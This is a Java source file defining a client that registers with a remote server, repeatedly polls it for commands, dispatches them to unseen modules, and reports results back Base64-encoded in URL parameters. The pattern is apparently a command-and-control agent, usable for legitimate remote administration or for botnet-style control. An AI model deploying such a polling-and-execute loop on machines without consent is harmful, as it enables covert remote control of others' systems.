package gq.glowman554;

import gq.glowman554.modules.Modules;

import java.io.IOException;
import java.util.Base64;

import gq.glowman554.utils.HttpUtils;
import gq.glowman554.utils.Log;
import net.shadew.json.Json;
import net.shadew.json.JsonNode;
import net.shadew.json.JsonSyntaxException;

public class Exs {
    public static final String base_url = "https://x.glowman554.gq/api/v2/exs";
    public Modules modules = new Modules(this);
    public String id;


    public String register() throws IOException {
        String response = HttpUtils.request(base_url + "/register");
        Json json = Json.json();
        JsonNode root = json.parse(response);

        id = root.get("id").asString();

        return id;
    }

    public void callback(String cid, String text) throws IOException {
        String url = String.format(base_url + "/callback?cid=%s&id=%s", cid, id);

        if (text != null) {
            url = url + "&text=" + Base64.getEncoder().encodeToString(text.getBytes());
        }

        HttpUtils.request(url);
    }

    public void pool_for_work() throws IOException, JsonSyntaxException {
        String work = HttpUtils.request(String.format(base_url + "/command?id=%s", id));
        Json json = Json.json();
        JsonNode root = json.parse(work);

        for(JsonNode node : root) {
            String command = node.get("key").asString();
            String cid = node.get("value").asString();

            try {
                this.modules.call(command, cid, this);
            } catch (Exception e) {
                Log.log(e);
            }
        }

    }
}
